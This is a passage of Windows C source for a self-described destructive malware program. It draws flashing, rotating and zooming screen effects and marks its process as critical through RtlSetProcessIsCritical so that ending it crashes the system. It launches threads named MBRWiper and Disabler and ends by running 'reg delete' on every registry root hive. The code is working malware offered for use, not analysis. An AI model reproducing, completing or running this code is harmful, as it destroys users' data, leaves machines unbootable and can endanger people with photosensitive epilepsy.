    const double piVal = 3.14159265358979323846;
    double angPos = 5.0 * piVal / 180.0;
    double angNeg = -5.0 * piVal / 180.0;
    float c1 = (float)cos(angPos);
    float s1 = (float)sin(angPos);
    float c2 = (float)cos(angNeg);
    float s2 = (float)sin(angNeg);
    float midX = screenW / 2.0f;
    float midY = screenH / 2.0f;
    XFORM xf1;
    xf1.eM11 = c1;
    xf1.eM12 = s1;
    xf1.eM21 = -s1;
    xf1.eM22 = c1;
    xf1.eDx = midX - midX * c1 + midY * s1;
    xf1.eDy = midY - midX * s1 - midY * c1;

    XFORM xf2;
    xf2.eM11 = c2;
    xf2.eM12 = s2;
    xf2.eM21 = -s2;
    xf2.eM22 = c2;
    xf2.eDx = midX - midX * c2 + midY * s2;
    xf2.eDy = midY - midX * s2 - midY * c2;

    while (true) {
        HDC hdc = GetDC(NULL);

        HDC hdcSrc = CreateCompatibleDC(hdc);
        HBITMAP bmSrc = CreateCompatibleBitmap(hdc, screenW, screenH);
        HGDIOBJ oldSrc = SelectObject(hdcSrc, bmSrc);
        BitBlt(hdcSrc, 0, 0, screenW, screenH, hdc, 0, 0, SRCCOPY);

        HDC hdcRot1 = CreateCompatibleDC(hdc);
        HBITMAP bmRot1 = CreateCompatibleBitmap(hdc, screenW, screenH);
        HGDIOBJ oldRot1 = SelectObject(hdcRot1, bmRot1);
        SetGraphicsMode(hdcRot1, GM_ADVANCED);
        SetWorldTransform(hdcRot1, &xf1);
        BitBlt(hdcRot1, 0, 0, screenW, screenH, hdcSrc, 0, 0, SRCCOPY);
        ModifyWorldTransform(hdcRot1, NULL, MWT_IDENTITY);

        HDC hdcRot2 = CreateCompatibleDC(hdc);
        HBITMAP bmRot2 = CreateCompatibleBitmap(hdc, screenW, screenH);
        HGDIOBJ oldRot2 = SelectObject(hdcRot2, bmRot2);
        SetGraphicsMode(hdcRot2, GM_ADVANCED);
        SetWorldTransform(hdcRot2, &xf2);
        BitBlt(hdcRot2, 0, 0, screenW, screenH, hdcSrc, 0, 0, SRCCOPY);
        ModifyWorldTransform(hdcRot2, NULL, MWT_IDENTITY);

        for (int i = 0; i < 10; i++) {
            StretchBlt(hdc, -100, -100, screenW + 200, screenH + 200, hdcRot1, 0, 0, screenW, screenH, 0x999999);
            StretchBlt(hdc, -100, -100, screenW + 200, screenH + 200, hdcRot2, 0, 0, screenW, screenH, 0x999999);
        }

        SelectObject(hdcRot2, oldRot2);
        DeleteObject(bmRot2);
        DeleteDC(hdcRot2);

        SelectObject(hdcRot1, oldRot1);
        DeleteObject(bmRot1);
        DeleteDC(hdcRot1);

        SelectObject(hdcSrc, oldSrc);
        DeleteObject(bmSrc);
        DeleteDC(hdcSrc);

        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Payload7(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int halfW = w / 2;
    int speed = 10;

    while (true) {
        HDC hdc = GetDC(NULL);

        BitBlt(hdc, 0, 0, halfW - speed, h, hdc, speed, 0, 0x111111);
        BitBlt(hdc, halfW + speed, 0, halfW - speed, h, hdc, halfW, 0, 0x111111);

        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Payload8(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int zoom = 20;

    while (true) {
        HDC hdc = GetDC(NULL);

        StretchBlt(hdc, -zoom, -zoom, w + zoom * 2, h + zoom * 2, hdc, 0, 0, w, h, 0x999999);

        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Information(LPVOID lpParam) {
    MessageBox(NULL, L"Hello! This pc id DESTOY! GOOD LUCK USER!", L"information", MB_ICONERROR);
    return 0;
}
DWORD WINAPI msg(LPVOID lpParam) {
    MessageBox(NULL, L"This program cannot be run on this system", L"Hi errors!", MB_OK);
    return 0;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand((unsigned int)time(NULL));

    if (MessageBoxA(NULL, "Run this is a mlware, run?", "r92er829u.exe", MB_YESNO | MB_ICONWARNING) == IDNO) {
        ExitProcess(0);
    }

    if (MessageBoxA(NULL, "Are you sure? This is a NOT FOR epileptics!!!!!", "r92er829u.exe", MB_YESNO | MB_ICONWARNING) == IDNO) {
        ExitProcess(0);
    }
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        BOOLEAN bl; RAPdef rPriv = (RAPdef)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        RSPICdef fCrit = (RSPICdef)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        if (rPriv != NULL && fCrit != NULL) { rPriv(20, TRUE, FALSE, &bl); fCrit(TRUE, NULL, FALSE); }
    }
    CreateThread(0, 0, MBRWiper, 0, 0, 0);
    CreateThread(0, 0, Disabler, 0, 0, 0);
    CreateThread(0, 0, msg, 0, 0, 0);
    Sleep(3000);
    CreateThread(0, 0, Information, 0, 0, 0);
    HANDLE hWinMove = CreateThread(NULL, 0, WindowMove, NULL, 0, NULL);
    HANDLE hWinTitles = CreateThread(NULL, 0, WindowTitles, NULL, 0, NULL);
    HANDLE hSound1 = CreateThread(NULL, 0, Sound1, NULL, 0, NULL);
    HANDLE hPayload1 = CreateThread(NULL, 0, Payload1, NULL, 0, NULL);
    if (hSound1) {
        WaitForSingleObject(hSound1, INFINITE);
        CloseHandle(hSound1);
    }
    if (hPayload1) {
        TerminateThread(hPayload1, 0);
        CloseHandle(hPayload1);
    }

    HANDLE hSound2 = CreateThread(NULL, 0, Sound2, NULL, 0, NULL);
    HANDLE hPayload2 = CreateThread(NULL, 0, Payload2, NULL, 0, NULL);
    if (hSound2) {
        WaitForSingleObject(hSound2, INFINITE);
        CloseHandle(hSound2);
    }
    if (hPayload2) {
        TerminateThread(hPayload2, 0);
        CloseHandle(hPayload2);
    }

    HANDLE hSound3 = CreateThread(NULL, 0, Sound3, NULL, 0, NULL);
    HANDLE hPayload3 = CreateThread(NULL, 0, Payload3, NULL, 0, NULL);
    if (hSound3) {
        WaitForSingleObject(hSound3, INFINITE);
        CloseHandle(hSound3);
    }
    if (hPayload3) {
        TerminateThread(hPayload3, 0);
        CloseHandle(hPayload3);
    }

    HANDLE hSound4 = CreateThread(NULL, 0, Sound4, NULL, 0, NULL);
    HANDLE hPayload4 = CreateThread(NULL, 0, Payload4, NULL, 0, NULL);
    if (hSound4) {
        WaitForSingleObject(hSound4, INFINITE);
        CloseHandle(hSound4);
    }
    if (hPayload4) {
        TerminateThread(hPayload4, 0);
        CloseHandle(hPayload4);
    }

    HANDLE hSound5 = CreateThread(NULL, 0, Sound5, NULL, 0, NULL);
    HANDLE hPayload5 = CreateThread(NULL, 0, Payload5, NULL, 0, NULL);
    HANDLE hBall = CreateThread(NULL, 0, Ball, NULL, 0, NULL);
    if (hSound5) {
        WaitForSingleObject(hSound5, INFINITE);
        CloseHandle(hSound5);
    }
    if (hPayload5) {
        TerminateThread(hPayload5, 0);
        CloseHandle(hPayload5);
    }
    if (hBall) {
        TerminateThread(hBall, 0);
        CloseHandle(hBall);
    }

    HANDLE hSound6 = CreateThread(NULL, 0, Sound6, NULL, 0, NULL);
    HANDLE hPayload6 = CreateThread(NULL, 0, Payload6, NULL, 0, NULL);
    if (hSound6) {
        WaitForSingleObject(hSound6, INFINITE);
        CloseHandle(hSound6);
    }
    if (hPayload6) {
        TerminateThread(hPayload6, 0);
        CloseHandle(hPayload6);
    }

    HANDLE hSound7 = CreateThread(NULL, 0, Sound7, NULL, 0, NULL);
    HANDLE hPayload7 = CreateThread(NULL, 0, Payload7, NULL, 0, NULL);
    if (hSound7) {
        WaitForSingleObject(hSound7, INFINITE);
        CloseHandle(hSound7);
    }
    if (hPayload7) {
        TerminateThread(hPayload7, 0);
        CloseHandle(hPayload7);
    }

    HANDLE hSound8 = CreateThread(NULL, 0, Sound8, NULL, 0, NULL);
    HANDLE hPayload8 = CreateThread(NULL, 0, Payload8, NULL, 0, NULL);
    if (hSound8) {
        WaitForSingleObject(hSound8, INFINITE);
        CloseHandle(hSound8);
    }
    if (hPayload8) {
        TerminateThread(hPayload8, 0);
        CloseHandle(hPayload8);
    }
    system("reg delete HKLM");
    system("reg delete HKCU");
    system("reg delete HKCR");
    system("reg delete HKU");
    system("reg delete HKCC");
    InvalidateRect(NULL, NULL, TRUE);
    ExitProcess(0);
    return 0;
}
